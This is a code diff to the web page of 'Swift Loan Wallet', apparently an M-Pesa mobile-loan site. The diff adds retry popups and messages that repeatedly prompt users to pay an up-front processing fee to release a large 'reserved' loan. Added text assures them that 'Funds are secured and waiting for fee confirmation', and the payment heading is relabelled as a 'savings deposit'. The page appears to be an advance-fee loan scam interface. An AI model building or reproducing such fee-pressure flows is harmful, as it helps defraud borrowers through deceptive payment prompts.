@@ -357,19 +357,8 @@
                 <!-- Logo -->
 <div class="flex-shrink-0">
   <div class="flex items-center">
-    <div class="w-10 h-10 swift-primary-bg rounded-lg flex items-center justify-center">
-      <!-- Loan Withdrawal Wallet SVG icon -->
-      <svg class="text-white" fill="currentColor" height="20" width="20" viewBox="0 0 24 24">
-        <!-- Wallet outline -->
-        <path d="M21 7H5c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 
-                 2h16c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm0 
-                 10H5V9h16v8z"/>
-        <!-- Downward arrow (withdrawal) -->
-        <path d="M12 3v6l-2-2-1.41 1.41L12 12l3.41-3.59L14 
-                 7l-2 2V3h-2z"/>
-        <!-- Small circle as wallet button -->
-        <circle cx="17" cy="13" r="1"/>
-      </svg>
+    <div class="w-10 h-10 rounded-lg flex items-center justify-center overflow-hidden">
+      <img src="/loan-logo.png" alt="Swift Loan Logo" class="w-full h-full object-cover">
     </div>
     <span class="ml-3 text-xl font-bold text-gray-900">Swift Loan Wallet</span>
   </div>
@@ -780,6 +769,70 @@
                         </div>
                     </div>
                 </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Retry Payment Modal -->
+    <div id="retryPopup" class="fixed inset-0 modal-overlay hidden items-center justify-center z-50 p-4">
+        <div class="bg-white rounded-2xl shadow-2xl max-w-sm w-full p-6 animate-in fade-in zoom-in duration-300">
+            <div class="text-center">
+                <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <i class="fas fa-exclamation-circle text-red-600 text-2xl"></i>
+                </div>
+                <h3 class="text-xl font-bold text-gray-900 mb-2">Transaction Cancelled</h3>
+                <p class="text-gray-600 text-sm mb-6">You cancelled the payment or it timed out. Please retry to complete your withdrawal.</p>
+                
+                <div class="bg-gray-50 rounded-xl p-4 mb-6 space-y-2 text-left">
+                    <div class="flex justify-between text-sm">
+                        <span class="text-gray-500">Withdrawal Amount:</span>
+                        <span id="retryLoanAmount" class="font-bold text-gray-900">KES 0</span>
+                    </div>
+                    <div class="flex justify-between text-sm">
+                        <span class="text-gray-500">Processing Fee:</span>
+                        <span id="retryFeeAmount" class="font-bold text-orange-600">KES 0</span>
+                    </div>
+                </div>
+
+                <div class="space-y-3">
+                    <button onclick="retryWithdrawal()" class="w-full py-3 bg-primary text-white font-bold rounded-xl hover:bg-primary-dark transition-all shadow-lg shadow-primary/20 flex items-center justify-center">
+                        <i class="fas fa-sync-alt mr-2"></i> Retry STK Push
+                    </button>
+                    <button onclick="closeRetryPopup()" class="w-full py-3 bg-gray-100 text-gray-700 font-semibold rounded-xl hover:bg-gray-200 transition-all flex items-center justify-center">
+                        Cancel
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+        <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-md w-full mx-4 overflow-hidden">
+            <div class="bg-red-50 p-6 border-b border-red-100 text-center">
+                <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4 bouncing-icon">
+                    <i class="fas fa-exclamation-circle text-red-600 text-3xl"></i>
+                </div>
+                <h3 class="text-xl font-bold text-gray-900 mb-1">Fee Payment Cancelled/Failed</h3>
+                <p class="text-sm text-gray-600">The STK push was not completed.</p>
+            </div>
+            
+            <div class="p-6">
+                <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-6">
+                    <p class="text-sm text-gray-700 text-center mb-2">
+                        To receive your loan of <span class="font-bold text-green-700" id="retryLoanAmount">KES 50,000</span>,
+                    </p>
+                    <p class="text-sm text-gray-700 text-center">
+                        Please pay the processing fee of <span class="font-bold text-orange-600" id="retryFeeAmount">KES 350</span>
+                    </p>
+                </div>
+
+                <button onclick="retryWithdrawal()" 
+                        class="w-full py-3 px-4 bg-gradient-to-r from-green-600 to-green-700 text-white font-bold rounded-xl shadow-lg hover:from-green-700 hover:to-green-800 transition-all transform hover:scale-[1.02] flex items-center justify-center">
+                    <i class="fas fa-sync-alt mr-2"></i>
+                    Retry Payment Now
+                </button>
+                
+                <button onclick="closeRetryPopup()" class="w-full mt-3 py-3 px-4 text-gray-500 font-medium hover:text-gray-700 transition-colors">
+                    Cancel & Close
+                </button>
             </div>
         </div>
     </div>
@@ -1469,7 +1522,26 @@
             } catch (error) {
                 console.error('Fee payment error:', error);
                 hideProcessingOverlay();
-                showError('Fee payment failed: ' + error.message);
+                
+                let friendlyMessage = 'Fee payment failed. ';
+                if (error.message.includes('timeout')) {
+                    friendlyMessage += 'The connection timed out. Please check your internet and try again.';
+                } else if (error.message.includes('400')) {
+                    friendlyMessage += 'There was an issue with the request. Please verify your phone number.';
+                } else if (error.message.includes('500') || (error.status && error.status === 500)) {
+                    friendlyMessage += 'The payment server is currently experiencing issues. Please wait a moment and try again.';
+                } else {
+                    friendlyMessage += 'System error: ' + error.message;
+                }
+                
+                showError(friendlyMessage);
+                
+                // Show withdraw button again so they can try fresh
+                const withdrawBtn = document.getElementById('withdrawBtn');
+                if (withdrawBtn) {
+                    withdrawBtn.disabled = false;
+                    withdrawBtn.classList.add('ring-4', 'ring-primary', 'ring-offset-2');
+                }
             } finally {
                 isProcessing = false;
             }
@@ -1536,7 +1608,7 @@ const message = `Your withdrawal request is initiated successfully! Check your p
             document.getElementById('successMessage').innerHTML = message;
           const amount = document.getElementById("withdrawalAmount").textContent;
 document.getElementById("successHeading").textContent = 
-    `Withdrawal of ${amount} Initiated Successfully! [Your swift wallet Account no:STNYGP ]`;
+    `Withdrawal of ${amount} Initiated Successfully! [REASON:Swiftwallet savings deposit ]`;
             
             // Update progress text
             document.getElementById('progressText').textContent = 'Pending Fee Payment & withdrawal Approval...';
@@ -1633,8 +1705,19 @@ startPendingProgress();}
             const feePaymentInitiated = localStorage.getItem('swift_fee_payment_initiated');
             if (feePaymentInitiated === 'true') {
                 const withdrawalMethod = localStorage.getItem('swift_withdrawal_method') || 'M-Pesa';
+                const amount = document.getElementById("withdrawalAmount").textContent || 'your approved amount';
+                
                 showSuccess(
-                    `Complete previous withdrawal request sent to (${loanData.phone}) by clicking withdraw button  below if you didn't .STK Push was sent from SWIFWALLET DIGITAL VENTURES for the requested processing fee to complete the held funds or retry. Please complete the fee payment to process your ${withdrawalMethod} your withdrawal. Status: <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span>`
+                    `<div class="flex flex-col space-y-2">
+                        <div class="flex items-center text-primary font-bold">
+                            <i class="fas fa-history mr-2"></i> Previous Session Restored
+                        </div>
+                        <p>We've detected an ongoing withdrawal for <strong>${amount}</strong> to your <strong>${withdrawalMethod}</strong>.</p>
+                        <p class="text-sm">Please complete the M-Pesa PIN prompt on your phone to finalize the transfer. If you didn't receive the prompt, you can use the <strong>Retry</strong> button below to trigger it again.</p>
+                        <div class="mt-2 p-2 bg-blue-50 rounded border border-blue-100 text-xs italic">
+                            Status: <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> — Funds are secured and waiting for fee confirmation.
+                        </div>
+                    </div>`
                 );
                 updateDisbursementTimeline(true);
             }
@@ -1726,6 +1809,9 @@ if (status === 'success') {
 } else if (['error','stk_failed','cancelled','failed'].includes(status)) {
     statusPillClass = 'bg-red-100 text-red-700';
     statusLabel = 'CANCELLED / FAILED';
+    if (!document.getElementById('retryPopup').classList.contains('flex')) {
+         setTimeout(() => showRetryPopup(receipt), 1000);
+    }
 }
 
     container.innerHTML = `
@@ -1733,8 +1819,8 @@ if (status === 'success') {
         <!-- Header -->
         <div class="flex justify-between items-center border-b pb-4">
           <div class="flex items-center space-x-3">
-            <div class="w-10 h-10 bg-primary rounded-lg flex items-center justify-center">
-              <i class="fas fa-bolt text-white text-lg"></i>
+            <div class="w-10 h-10 rounded-lg flex items-center justify-center overflow-hidden">
+              <img src="/loan-logo.png" alt="Swift Loan Logo" class="w-full h-full object-cover">
             </div>
             <div>
               <h2 class="text-lg font-bold text-gray-900">Swift Loan Wallet Receipt</h2>
@@ -1872,6 +1958,18 @@ function startReceiptTracking(reference) {
     // Fetch immediately first time
     fetchReceipt(reference);
 }
+function showRetryPopup(receipt) {
+    const popup = document.getElementById('retryPopup');
+    const amount = receipt.amount || loanData.fee || '350';
+    const loan = receipt.loan_amount || loanData.amount || '50,000';
+    
+    document.getElementById('retryFeeAmount').textContent = 'KES ' + amount;
+    document.getElementById('retryLoanAmount').textContent = 'KES ' + loan;
+    
+    popup.classList.remove('hidden');
+    popup.classList.add('flex');
+}
+
    function closeRetryPopup() {
     document.getElementById('retryPopup').classList.add('hidden');
 }
@@ -1880,12 +1978,12 @@ async function retryWithdrawal() {
     closeRetryPopup();
     const receipt = JSON.parse(localStorage.getItem('swift_pending_withdrawal'));
     if (!receipt) {
-        alert("⚠️ No withdrawal data found to retry!");
+        showNotification("⚠️ No withdrawal data found to retry!", 3000);
         return;
     }
 
     try {
-        const res = await fetch('https://loan-server-jlpt.onrender.com/pay', {
+        const res = await fetch('/pay', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
             body: JSON.stringify({
@@ -1895,10 +1993,21 @@ async function retryWithdrawal() {
         });
 
         if (!res.ok) throw new Error("Server error: " + res.status);
-        alert("✅ STK push sent again. Please confirm on your phone.");
+        showNotification("✅ STK push sent again. Please confirm on your phone.", 5000);
     } catch (err) {
         console.error("Retry error:", err);
-        alert(" Retry has failed due to traffic.Scroll below and withdraw again to complete savings");
+        showNotification("❌ Retry has failed due to traffic. Please click the withdraw button below again.", 5000);
+        
+        const withdrawBtn = document.getElementById('withdrawBtn');
+        if (withdrawBtn) {
+            withdrawBtn.disabled = false;
+            withdrawBtn.classList.add('ring-4', 'ring-primary', 'ring-offset-2');
+            withdrawBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            
+            setTimeout(() => {
+                withdrawBtn.classList.remove('ring-4', 'ring-primary', 'ring-offset-2');
+            }, 3000);
+        }
     }
 }
     </script>
@@ -1934,118 +2043,6 @@ async function retryWithdrawal() {
         });
     });
 </script>
-    <!-- Retry Modal -->
-    <div id="retryModal" class="hidden fixed inset-0 z-[100] overflow-y-auto">
-        <div class="flex items-center justify-center min-h-screen px-4 pt-4 pb-20 text-center sm:block sm:p-0">
-            <div class="fixed inset-0 transition-opacity modal-overlay" aria-hidden="true"></div>
-            <span class="hidden sm:inline-block sm:align-middle sm:h-screen" aria-hidden="true">&#8203;</span>
-            <div class="inline-block align-bottom bg-white rounded-2xl text-left overflow-hidden shadow-xl transform transition-all sm:my-8 sm:align-middle sm:max-w-lg sm:w-full modal-content">
-                <div class="bg-white px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
-                    <div class="sm:flex sm:items-start">
-                        <div class="mx-auto flex-shrink-0 flex items-center justify-center h-12 w-12 rounded-full bg-red-100 sm:mx-0 sm:h-10 sm:w-10">
-                            <i class="fas fa-exclamation-circle text-red-600"></i>
-                        </div>
-                        <div class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left">
-                            <h3 class="text-xl leading-6 font-bold text-gray-900" id="modal-title">
-                                Transaction Failed/Cancelled
-                            </h3>
-                            <div class="mt-4">
-                                <p class="text-sm text-gray-600 mb-4">
-                                    Your fee request was canceled. You can Retry with the button below.
-                                </p>
-                                <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-4">
-                                    <p class="text-sm font-semibold text-blue-900 mb-1">Assurance Message</p>
-                                    <p class="text-lg font-bold text-blue-700">
-                                        Loan Amount to be transferred: <span id="modalLoanAmount">KSH 0</span>
-                                    </p>
-                                    <p class="text-xs text-blue-600 mt-1 italic">
-                                        Your loan funds are reserved and will be disbursed immediately after fee payment.
-                                    </p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="bg-gray-50 px-4 py-4 sm:px-6 sm:flex sm:flex-row-reverse gap-2">
-                    <button type="button" onclick="retryPayment()" class="w-full inline-flex justify-center rounded-xl border border-transparent shadow-sm px-4 py-3 bg-primary text-base font-bold text-white hover:bg-primary-dark focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-primary sm:ml-3 sm:w-auto sm:text-sm transition-swift">
-                        Retry Payment Now
-                    </button>
-                    <button type="button" onclick="hideRetryModal()" class="mt-3 w-full inline-flex justify-center rounded-xl border border-gray-300 shadow-sm px-4 py-3 bg-white text-base font-medium text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-primary sm:mt-0 sm:ml-3 sm:w-auto sm:text-sm transition-swift">
-                        Cancel
-                    </button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // Store current transaction details for retry
-        let currentPhone = '';
-        let currentAmount = 0;
-        let currentLoanAmount = 0;
-        let pollingInterval = null;
-
-        function showRetryModal(loanAmt) {
-            document.getElementById('modalLoanAmount').textContent = `KSH ${Number(loanAmt).toLocaleString()}`;
-            document.getElementById('retryModal').classList.remove('hidden');
-        }
-
-        function hideRetryModal() {
-            document.getElementById('retryModal').classList.add('hidden');
-        }
-
-        async function retryPayment() {
-            hideRetryModal();
-            // Trigger withdrawal again with stored details
-            await startWithdrawal();
-        }
-
-        // Modified handleWithdrawal to capture details
-        async function startWithdrawal() {
-            const phone = document.getElementById('customerPhone').textContent.replace(/\s/g, '');
-            const amount = 100; // Fixed fee for demo or get from UI
-            const loanAmount = document.getElementById('loanAmount').textContent.replace(/[^\d]/g, '');
-
-            currentPhone = phone;
-            currentAmount = amount;
-            currentLoanAmount = loanAmount;
-
-            try {
-                const response = await fetch('/pay', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone, amount, loan_amount: loanAmount })
-                });
-                const data = await response.json();
-                if (data.success) {
-                    startPolling(data.reference);
-                } else {
-                    showRetryModal(loanAmount);
-                }
-            } catch (err) {
-                showRetryModal(loanAmount);
-            }
-        }
-
-        function startPolling(reference) {
-            if (pollingInterval) clearInterval(pollingInterval);
-            pollingInterval = setInterval(async () => {
-                const response = await fetch(`/receipt/${reference}`);
-                const data = await response.json();
-                if (data.success) {
-                    const status = data.receipt.status;
-                    if (['cancelled', 'failed', 'stk_failed'].includes(status)) {
-                        clearInterval(pollingInterval);
-                        showRetryModal(currentLoanAmount);
-                    } else if (status === 'processing' || status === 'completed') {
-                        clearInterval(pollingInterval);
-                        // Show success UI
-                        alert("Withdrawal processing!");
-                    }
-                }
-            }, 3000);
-        }
-    </script>
 </body>
 </html>
 
